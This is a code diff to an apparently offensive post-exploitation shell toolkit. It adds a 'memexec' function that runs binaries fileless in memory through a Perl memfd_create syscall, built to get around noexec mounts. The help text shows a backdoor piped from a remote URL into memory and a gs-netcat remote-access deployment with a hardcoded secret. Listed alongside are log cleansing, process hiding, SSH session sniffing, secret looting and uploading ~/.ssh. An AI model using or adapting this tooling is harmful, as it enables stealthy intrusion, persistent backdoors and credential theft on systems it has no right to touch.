@@ -71,6 +71,20 @@ ${CDC}tit read  <PID>${CN}       - Sniff ssh session (ssh reads from user input)
 ${CDC}tit write <PID>${CN}       - Sniff sshd session (sshd writes to the PTY/shell)"
 }
 
+xhelp_memexec() {
+    echo -e "
+Circumvent the noexec flag or when there is no writeable location on the remote
+file-system to deploy your binary/backdoor.
+
+Examples:
+1. ${CDC}cat /usr/bin/id | memexec -u${CN}
+2. ${CDC}curl -SsfL https://thc.org/my-backdoor-binary | memexec${CN}
+
+Or a real world example to deploy gsocket without touching the file system
+or /dev/shm or /tmp (Change the -sSECRET please):
+${CDC}GS_ARGS=\"-ilqD -s5sLosWHZLpE9riqt74KvG9\" memexec <(curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-\$(uname -m))${CN}"
+}
+
 xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
 xsu() {
     local name="${1:?}"
@@ -981,6 +995,25 @@ xdestruct() {
     export HOME="${_HS_HOME_ORIG}"
 }
 
+# memexec /bin/sh -c "echo hi"
+# memexec -c "echo hi" </bin/sh
+# GS_ARGS="-ilqD -s 5sLosWHZLpE9riqt74KvG9" memexec <(curl -SsfL https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-$(uname -m))
+memexec() {
+    local stropen strread
+    local strargv0='"foo", '
+    [ -t 0 ] && {
+        stropen="open(\$i, '<', '$1') or die 'open: \$!';"
+        strread='$i'
+        unset strargv0
+    }
+    perl -e '$f=syscall(319, $n="", 1);
+if(-1==$f){ $f=syscall(279, $n="", 1); if(-1==$f){ die "memfd_create: $!";}}
+'"${stropen}"'
+open($o, ">&=".$f) or die "open: $!";
+while(<'"${strread:-STDIN}"'>){print $o $_;}
+exec {"/proc/$$/fd/$f"} '"${strargv0}"'@ARGV or die "exec: $!";' -- "$@"
+}
+
 ttyinject() {
     local is_mkdir
     ttyinject_clean() {
@@ -1210,16 +1243,17 @@ xhelp() {
     [[ "$1" == "scan" ]] && { xhelp_scan; return; }
     [[ "$1" == "dbin" ]] && { xhelp_dbin; return; }
     [[ "$1" == "tit" ]] && { xhelp_tit; return; }
+    [[ "$1" == "memexec" ]] && { xhelp_memexec; return; }
 
     echo -en "\
 ${CDC} xlog '1\.2\.3\.4' /var/log/auth.log   ${CDM}Cleanse log file
 ${CDC} xsu username                          ${CDM}Switch user
-${CDC} xtmux                                 ${CDM}'hidden' tmux ${CN}${CF}[e.g. empty tmux list-s]
+${CDC} xtmux                                 ${CDM}'hidden' tmux ${CN}${CF}[e.g. wont show with 'tmux list-s']
 ${CDC} xssh & xscp                           ${CDM}Silently log in to remote host
 ${CDC} bounce <port> <dst-ip> <dst-port>     ${CDM}Bounce tcp traffic to destination
 ${CDC} ghostip                               ${CDM}Originate from a non-existing IP
 ${CDC} burl http://ipinfo.io 2>/dev/null     ${CDM}Request URL ${CN}${CF}[no https support]
-${CDC} dl http://ipinfo.io 2>/dev/null       ${CDM}Request URL using one of curl/wget/python
+${CDC} dl http://ipinfo.io 2>/dev/null       ${CDM}Request URL using one of curl/wget/python/perl/openssl
 ${CDC} transfer ~/.ssh                       ${CDM}Upload a file or directory ${CN}${CF}[${HS_TRANSFER_PROVIDER}]
 ${CDC} shred file                            ${CDM}Securely delete a file
 ${CDC} notime <file> touch foo.dat           ${CDM}Execute a command at the <file>'s mtime
@@ -1235,6 +1269,7 @@ ${CDC} rdns 1.2.3.4                          ${CDM}Reverse DNS from multiple pub
 ${CDC} cn <IP> [<port>]                      ${CDM}Display TLS's CommonName of remote IP
 ${CDC} scan <port> [<IP or file> ...]        ${CDM}TCP Scan a port + IP ${CN}${CF}[xhelp scan]
 ${CDC} hide <pid>                            ${CDM}Hide a process
+${CDC} memexec <binary> [<args>]             ${CDM}Start binary in memory ${CN}${CF}[xhelp memexec]
 ${CDC} tit <read/write> <pid>                ${CDM}Sniff/strace the User Input [xhelp tit]
 ${CDC} np <directory>                        ${CDM}Display secrets with NoseyParker ${CN}${CF}[try |less -R]
 ${CDC} loot                                  ${CDM}Display common secrets
